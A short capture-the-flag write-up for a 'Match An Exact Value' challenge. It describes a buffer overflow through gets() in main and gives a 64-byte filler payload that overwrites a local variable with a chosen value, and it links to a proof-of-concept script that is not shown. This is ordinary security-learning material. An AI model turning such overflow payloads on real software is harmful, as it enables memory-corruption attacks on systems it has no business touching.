# Challenge `Match An Exact Value` writeup

- **Vulnerability:** Buffer Overflow
- **Where:** buffer in main written with gets()
- **Impact:** Allows writing over local variable `test`

## Steps to reproduce

1. Send input to fill the buffer plus new value for test variable.
   ```
   b'A'*64+b'\x64\x63\x62\x61'
   ```

[POC](match_exact_val.py)
